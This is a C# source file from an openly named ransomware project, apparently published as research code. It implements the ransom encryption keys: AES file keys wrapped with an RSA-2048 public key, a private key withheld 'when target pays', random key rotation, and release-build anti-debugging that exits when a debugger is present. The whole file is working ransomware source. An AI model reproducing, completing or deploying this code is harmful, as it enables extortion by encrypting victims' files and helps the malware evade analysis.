/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

using KeePassLib.Security;
using KeePassLib.Utility;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using KeePassLib.Cryptography;

namespace BisquillaRansomware
{
    /// <summary>
    /// Cripto Key Manager
    /// </summary>
    public sealed class CriptoKeyManager
    {
        private CriptoKeyManager() { }

        /// <summary>
        /// Current Public Key
        /// </summary>
        private static ProtectedString PUBLIC_KEY = null;

        /// <summary>
        /// Current Private Key (Usually Null) - Used only When Target Pays to Decript there Machine
        /// </summary>
        private static ProtectedString PRIVATE_KEY = null;

        /// <summary>
        /// Current Key used to Encript File protected with RSA-2048 KEY
        /// </summary>
        public static Byte[] CURRENT_ENCRYPTED_FILE_ENCRIPTION_KEY = null;

        /// <summary>
        /// Current IV used to Encript File protected with RSA-2048 KEY
        /// </summary>
        public static Byte[] CURRENT_ENCRYPTED_FILE_ENCRIPTION_IV = null;

        /// <summary>
        /// Current Key used to Encript File in PlainText
        /// </summary>
        public static Byte[] CURRENT_FILE_ENCRIPTION_KEY = null;

        /// <summary>
        /// Current IV used to Encript File in PlainText
        /// </summary>
        public static Byte[] CURRENT_FILE_ENCRIPTION_IV = null;

        /// <summary>
        /// Protect a Symmetric Key
        /// </summary>
        public static void ProtectSymmetricKey(ref Byte[] currentKey, ref Byte[] currentIv, ref ProtectedString publicKey)
        {
            // Copy Key
            CURRENT_FILE_ENCRIPTION_KEY = new byte[currentKey.Length];
            CURRENT_FILE_ENCRIPTION_IV = new byte[currentIv.Length];
            Array.Copy(currentKey, CURRENT_FILE_ENCRIPTION_KEY, currentKey.Length);
            Array.Copy(currentIv, CURRENT_FILE_ENCRIPTION_IV, currentIv.Length);

            // Encript Current Key and Password
            String pKey = "";
            Common.OpenSecureString(ref pKey, ref publicKey);

            // Load Key Into Cypher
            using (RSACryptoServiceProvider rsaAlgh = new RSACryptoServiceProvider())
            {
                // Load
                rsaAlgh.FromXmlString(pKey);

                // Encript
                currentKey = rsaAlgh.Encrypt(currentKey, true);
                currentIv = rsaAlgh.Encrypt(currentIv, true);
            }
        }

        /// <summary>
        /// Unprotect a Symmetric Key
        /// </summary>
        public static void UnprotectSymmetricKey(ref byte[] protectedKey, ref byte[] key, ref byte[] protectedIv, ref byte[] iv)
        {
            // Encript Current Key and Password
            string pKey = "";
            Common.OpenSecureString(ref pKey, ref PRIVATE_KEY);

            // Load Key Into Cypher
            using (RSACryptoServiceProvider rsaAlgh = new RSACryptoServiceProvider())
            {
                // Load
                rsaAlgh.FromXmlString(pKey);

                // Encript
                key = rsaAlgh.Decrypt(protectedKey, true);
                iv = rsaAlgh.Decrypt(protectedIv, true);
            }
        }

        /// <summary>
        /// Generates a new Symmetric Key Pair
        /// </summary>
        public static void GenSymmetricKeyPair(ref byte[] key, ref byte[] iv)
        {
            key = new byte[32];
            iv = new byte[12];

            using (SHA512Managed h = new SHA512Managed())
            {
                byte[] randomBytes = CryptoRandom.Instance.GetRandomBytes(64);
                byte[] pbHash = h.ComputeHash(randomBytes);

                Common.ClearArray(ref randomBytes);

                Array.Copy(pbHash, key, 32);
                Array.Copy(pbHash, 32, iv, 0, 12);

                Common.ClearArray(ref pbHash);
            }
        }

        /// <summary>
        /// Generates a RSA-2048 Public and Private Key
        /// </summary>
        public static unsafe void GenRsaKeyPair(ref ProtectedString privateAndPublicKey, ref ProtectedString publicKeyOnly)
        {
            using (RSA rsa = new RSACryptoServiceProvider())
            {
                // Set KeySize
                rsa.KeySize = 2048;

                // Export Private key
                string pri = rsa.ToXmlString(true);
                byte[] pbUtf8a = StrUtil.Utf8.GetBytes(pri);
                privateAndPublicKey = new ProtectedString(true, pbUtf8a);
                Common.ClearString(ref pri);
                Common.ClearArray(ref pbUtf8a);

                // Export PublicKey
                string pub = rsa.ToXmlString(false);
                byte[] pbUtf8b = StrUtil.Utf8.GetBytes(pub);
                publicKeyOnly = new ProtectedString(true, pbUtf8b);
                Common.ClearString(ref pub);
                Common.ClearArray(ref pbUtf8b);
            }
        }



        /// <summary>
        /// Rotates a Chyper Key
        /// </summary>
        public static void RotateAesKey()
        {
#if !DEBUG
            // BEGIN DEBUG DETECTION
            bool isDebuggerPresent = false;
            Common.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent || Debugger.IsAttached)
            {
                Environment.Exit(-1);
            }
            // END DEBUG DETECTION
#endif

            if (CURRENT_ENCRYPTED_FILE_ENCRIPTION_KEY == null)
            {
#if DEBUG
                Trace.WriteLine("[+] Fresh Key Generated");
#endif
                GenSymmetricKeyPair(ref CURRENT_ENCRYPTED_FILE_ENCRIPTION_KEY, ref CURRENT_ENCRYPTED_FILE_ENCRIPTION_IV);
                ProtectSymmetricKey(ref CURRENT_ENCRYPTED_FILE_ENCRIPTION_KEY, ref CURRENT_ENCRYPTED_FILE_ENCRIPTION_IV, ref PUBLIC_KEY);
            }
            else if (Common.random.Next(1, 100) <= 5) // 5% of Chance to Rotate Key
            {
#if DEBUG
                Trace.WriteLine("[+] **************** Key is Rotated ****************");
#endif
                GenSymmetricKeyPair(ref CURRENT_ENCRYPTED_FILE_ENCRIPTION_KEY, ref CURRENT_ENCRYPTED_FILE_ENCRIPTION_IV);
                ProtectSymmetricKey(ref CURRENT_ENCRYPTED_FILE_ENCRIPTION_KEY, ref CURRENT_ENCRYPTED_FILE_ENCRIPTION_IV, ref PUBLIC_KEY);
            }
        }


        /// <summary>
        /// Load a Local Public Key OR Generate a New One
        /// </summary>
        public unsafe static void EnsureLocalPublicKey()
        {
#if DEBUG
            Trace.WriteLine("[*] EnsureLocalPublicKey");
            Trace.Indent();
#endif

            if (File.Exists(ConfigurationManager.LOCAL_PUB_KEY_NAME))
            {
#if DEBUG
                Trace.WriteLine("[+] Loading File");
#endif
                // Load Public Key
                Common.ReadFileToProtectedString(ConfigurationManager.LOCAL_PUB_KEY_NAME, ref PUBLIC_KEY);

                // Load Private key
                Common.ReadFileToProtectedString(ConfigurationManager.LOCAL_PRI_KEY_NAME, ref PRIVATE_KEY);
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] Creating New File");
#endif
                // Generate a New One
                CriptoKeyManager.GenRsaKeyPair(ref PRIVATE_KEY, ref PUBLIC_KEY);

                // Save Public Key
                Common.SaveProtectedStringIntoFile(ConfigurationManager.LOCAL_PUB_KEY_NAME, ref PUBLIC_KEY);

#if DEBUG
                // Save Public Key (IN DEBUG MODE ONLY!!!!)
                Common.SaveProtectedStringIntoFile(ConfigurationManager.LOCAL_PRI_KEY_NAME, ref PRIVATE_KEY);
#endif
            }

#if DEBUG
            Trace.Unindent();
#endif
        }


    }
}
